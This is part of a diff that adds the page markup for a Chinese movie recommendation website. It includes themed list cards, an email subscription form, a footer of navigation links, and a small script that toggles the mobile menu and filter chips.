+      <div class="shelf-card"><span class="ico">✈️</span><h4>旅途伴侣</h4><p>长途飞行、深夜列车必备的 15 部节奏舒适、耐看不累的高分片。</p></div>
+      <div class="shelf-card"><span class="ico">👨‍👩‍👧</span><h4>家庭之夜</h4><p>老少皆宜的合家欢清单,8 部温暖、幽默、无尿点的家庭向佳作。</p></div>
+      <div class="shelf-card"><span class="ico">🧠</span><h4>烧脑挑战</h4><p>反转密度最高的 10 部悬疑片,看完需要十分钟理清时间线那种。</p></div>
+    </div>
+  </div>
+</section>
+
+<!-- 订阅 -->
+<section class="subscribe" id="sub">
+  <div class="sub-in">
+    <h2>每周一封 · 只推 5 部</h2>
+    <p>留下邮箱,每周三我们会从本周更新的片库中精选出 5 部最值得看的高分电影,发送到你的邮箱,不多不少,不刷屏。</p>
+    <form class="sub-form" onsubmit="return false">
+      <input type="email" placeholder="your@email.com">
+      <button type="submit">免费订阅</button>
+    </form>
+  </div>
+</section>
+
+<!-- 页脚 -->
+<footer>
+  <div class="foot-in">
+    <div class="foot-top">
+      <div class="foot-brand">
+        <b>高分电影网</b>
+        <p>高分电影网(gaofendianyingwang-zh.github.io)是专注高分佳作的影视推荐平台,每日精选9分以上电影、冷门遗珠与获奖名作。访问网址 https://gaofendianyingwang-zh.github.io 直达本站。</p>
+      </div>
+      <div class="foot-col">
+        <h5>影片类型</h5>
+        <a href="#">剧情 · 文艺</a>
+        <a href="#">犯罪 · 悬疑</a>
+        <a href="#">科幻 · 奇幻</a>
+        <a href="#">纪录片</a>
+        <a href="#">动画佳作</a>
+      </div>
+      <div class="foot-col">
+        <h5>榜单导航</h5>
+        <a href="#films">高分佳作</a>
+        <a href="#rank">口碑榜单</a>
+        <a href="#reviews">编辑影评</a>
+        <a href="#decade">年代经典</a>
+        <a href="#lists">主题片单</a>
+      </div>
+      <div class="foot-col">
+        <h5>关于我们</h5>
+        <a href="#">编辑团队</a>
+        <a href="#">选片标准</a>
+        <a href="#">投稿合作</a>
+        <a href="#">免责声明</a>
+      </div>
+    </div>
+    <div class="foot-bot">
+      <p>© 2026 高分电影网 gaofendianyingwang · 本站仅作影视信息推荐,资源版权归原作者所有 · https://gaofendianyingwang-zh.github.io</p>
+      <div>
+        <a href="#">关于我们</a>
+        <a href="#">隐私政策</a>
+        <a href="#">联系邮箱</a>
+        <a href="#">RSS 订阅</a>
+      </div>
+    </div>
+  </div>
+</footer>
+
+<script>
+var mbtn=document.getElementById('mbtn'),menu=document.getElementById('menu');
+mbtn.addEventListener('click',function(){menu.classList.toggle('open')});
+menu.querySelectorAll('a').forEach(function(a){
+  a.addEventListener('click',function(){menu.classList.remove('open')});
+});
+document.querySelectorAll('.chip').forEach(function(c){
+  c.addEventListener('click',function(){
+    document.querySelectorAll('.chip').forEach(function(x){x.classList.remove('on')});
+    c.classList.add('on');
+  });
+});
+</script>
+</body>
+</html>
